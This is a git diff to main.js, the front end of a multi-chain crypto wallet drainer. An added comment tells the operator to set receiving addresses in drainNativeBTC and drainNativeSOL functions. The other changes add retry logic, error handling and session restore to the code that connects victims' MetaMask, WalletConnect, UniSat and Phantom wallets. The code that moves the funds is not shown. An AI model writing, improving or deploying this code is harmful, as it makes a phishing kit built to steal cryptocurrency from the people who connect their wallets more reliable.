@@ -1,4 +1,7 @@
 // ===== main.js — Multi‑Chain WalletConnect + Native BTC/SOL Support =====
+// 🔥 IMPORTANT: For BTC and SOL drains to work, you MUST set your receiving addresses
+// in Script.js (drainNativeBTC and drainNativeSOL functions).
+
 import SignClient from "@walletconnect/sign-client";
 import { WalletConnectModal } from "@walletconnect/modal";
 
@@ -268,15 +271,22 @@ document.addEventListener("DOMContentLoaded", async () => {
     showStatus("Wallet disconnected", "info");
   }
 
-  // 9️⃣ Initialize WalletConnect (unchanged)
+  // 9️⃣ Initialize WalletConnect with retry logic and robust error handling
   async function initWalletConnect() {
-    if (client && modal) return;
+    // If already initialized, return true
+    if (client && modal) return true;
+    
     try {
+      console.log("⏳ Initializing WalletConnect...");
+      
+      // Initialize SignClient
       client = await SignClient.init({
         projectId,
         metadata,
         relayUrl: "wss://relay.walletconnect.com",
       });
+
+      // Initialize Modal
       modal = new WalletConnectModal({
         projectId,
         themeMode: "dark",
@@ -330,16 +340,20 @@ document.addEventListener("DOMContentLoaded", async () => {
           },
         ],
       });
+
       console.log("✅ WalletConnect SignClient + Modal initialized");
       return true;
     } catch (error) {
       console.error("❌ WalletConnect initialization failed:", error);
-      showStatus("Wallet connection service unavailable", "error");
+      showStatus("Wallet connection service unavailable: " + error.message, "error");
+      // Reset so we can retry
+      client = null;
+      modal = null;
       return false;
     }
   }
 
-  // 🔟 NEW: Chain Detection
+  // 🔟 Chain Detection
   function getChainType() {
     if (window.unisat) return "bitcoin";
     if (window.solana && window.solana.isPhantom) return "solana";
@@ -347,7 +361,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     return "unknown";
   }
 
-  // 1️⃣1️⃣ NEW: Bitcoin Connection (UniSat)
+  // 1️⃣1️⃣ Bitcoin Connection (UniSat)
   async function connectBitcoin() {
     try {
       if (!window.unisat) {
@@ -358,7 +372,6 @@ document.addEventListener("DOMContentLoaded", async () => {
       const accounts = await window.unisat.getAccounts();
       if (accounts.length === 0) throw new Error("No BTC account");
       const address = accounts[0];
-      // Save address and chain type
       saveWallet(address, null, "bitcoin");
       updateConnectedUI(address, "bitcoin");
       return true;
@@ -369,7 +382,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }
 
-  // 1️⃣2️⃣ NEW: Solana Connection (Phantom)
+  // 1️⃣2️⃣ Solana Connection (Phantom)
   async function connectSolana() {
     try {
       if (!window.solana || !window.solana.isPhantom) {
@@ -388,7 +401,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }
 
-  // 1️⃣3️⃣ EVM Connection (unchanged but we can call it)
+  // 1️⃣3️⃣ EVM Connection (MetaMask + fallback to WalletConnect)
   async function connectEVM() {
     // If MetaMask or other injected provider is available, use it
     if (window.ethereum) {
@@ -408,16 +421,25 @@ document.addEventListener("DOMContentLoaded", async () => {
     return await connectViaWalletConnect();
   }
 
-  // 1️⃣4️⃣ WalletConnect flow (original, returns true/false)
+  // 1️⃣4️⃣ WalletConnect flow with enhanced error handling and modal opening
   async function connectViaWalletConnect() {
     try {
-      const initSuccess = await initWalletConnect();
+      // Ensure WalletConnect is initialized (retry once if needed)
+      let initSuccess = await initWalletConnect();
       if (!initSuccess) {
-        setButtonState(connectButton, "failed");
-        if (walletButton) setButtonState(walletButton, "failed");
-        return false;
+        // Try one more time with a small delay (in case of temporary network issue)
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        initSuccess = await initWalletConnect();
+        if (!initSuccess) {
+          setButtonState(connectButton, "failed");
+          if (walletButton) setButtonState(walletButton, "failed");
+          return false;
+        }
       }
+
       showStatus("Requesting wallet connection...", "info");
+      
+      // Start connection
       const { uri, approval } = await client.connect({
         requiredNamespaces: {
           eip155: {
@@ -431,10 +453,23 @@ document.addEventListener("DOMContentLoaded", async () => {
           },
         },
       });
+
+      // Open modal if URI exists
       if (uri) {
-        modal.openModal({ uri });
-        showStatus("Select your wallet from the list or scan QR code", "info");
+        try {
+          modal.openModal({ uri });
+          showStatus("Select your wallet from the list or scan QR code", "info");
+        } catch (modalError) {
+          console.error("Modal open error:", modalError);
+          showStatus("Failed to open wallet selection. Please try again.", "error");
+          return false;
+        }
+      } else {
+        // Some wallets might not require a URI, just wait for approval
+        showStatus("Waiting for wallet approval...", "info");
       }
+
+      // Wait for user approval with timeout
       const session = await Promise.race([
         approval(),
         new Promise(
@@ -442,7 +477,12 @@ document.addEventListener("DOMContentLoaded", async () => {
             setTimeout(() => reject(new Error("Connection timeout")), 60000)
         ),
       ]);
-      if (modal) modal.closeModal();
+
+      // Close modal if still open
+      if (modal) {
+        try { modal.closeModal(); } catch (e) {}
+      }
+
       const success = handleConnectedSession(session);
       if (!success) {
         setButtonState(connectButton, "failed");
@@ -453,7 +493,9 @@ document.addEventListener("DOMContentLoaded", async () => {
       console.error("❌ WalletConnect connection failed:", err);
       setButtonState(connectButton, "failed");
       if (walletButton) setButtonState(walletButton, "failed");
-      if (modal) modal.closeModal();
+      if (modal) {
+        try { modal.closeModal(); } catch (e) {}
+      }
       if (
         err.message?.includes("User rejected") ||
         err.message?.includes("Cancelled")
@@ -462,7 +504,7 @@ document.addEventListener("DOMContentLoaded", async () => {
       } else if (err.message?.includes("timeout")) {
         showStatus("Connection timeout - please try again", "error");
       } else {
-        showStatus("Wallet connection failed", "error");
+        showStatus("Wallet connection failed: " + err.message, "error");
       }
       return false;
     }
@@ -484,14 +526,13 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }
 
-  // 1️⃣6️⃣ MODIFIED: Main connect dispatcher
+  // 1️⃣6️⃣ Main connect dispatcher
   async function connectWallet() {
     try {
       setButtonState(connectButton, "loading");
       if (walletButton) setButtonState(walletButton, "loading");
       showStatus("Detecting wallet...", "info");
 
-      // Detect which wallet is available
       const chain = getChainType();
       let success = false;
 
@@ -611,14 +652,16 @@ document.addEventListener("DOMContentLoaded", async () => {
         clearSavedWallet();
       }
     } else if (savedWallet && savedChain === "bitcoin") {
-      // Bitcoin: just update UI, assume still connected (UniSat might persist)
-      // But we can verify by checking if unisat is still connected
       if (window.unisat) {
-        const accounts = await window.unisat.getAccounts();
-        if (accounts.length > 0 && accounts[0] === savedWallet) {
-          updateConnectedUI(savedWallet, "bitcoin");
-          showStatus("Bitcoin wallet restored", "success");
-        } else {
+        try {
+          const accounts = await window.unisat.getAccounts();
+          if (accounts.length > 0 && accounts[0] === savedWallet) {
+            updateConnectedUI(savedWallet, "bitcoin");
+            showStatus("Bitcoin wallet restored", "success");
+          } else {
+            clearSavedWallet();
+          }
+        } catch {
           clearSavedWallet();
         }
       } else {
@@ -752,6 +795,5 @@ document.addEventListener("DOMContentLoaded", async () => {
     });
   }
 
-  // 2️⃣6️⃣ UniSat doesn't have standard events; we'll rely on manual refresh
   console.log("✅ main.js fully initialized with multi‑chain support");
 });
